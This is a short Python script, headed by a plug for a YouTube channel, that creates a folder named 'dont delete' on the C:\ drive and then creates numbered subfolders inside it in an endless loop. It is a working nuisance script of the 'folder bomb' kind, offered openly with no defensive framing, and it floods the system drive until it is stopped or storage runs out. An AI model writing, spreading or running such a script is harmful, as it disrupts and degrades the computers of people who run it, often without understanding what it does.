# Please Subscribe my youtube channel "Problem Solve with Ridoy"
import os

path = "C:\\"
os.makedirs(f"{path}dont delete")
count = 0
while True:
    os.makedirs(f"{path}dont delete\\{count}")
    count += 1
    print("folder creating")




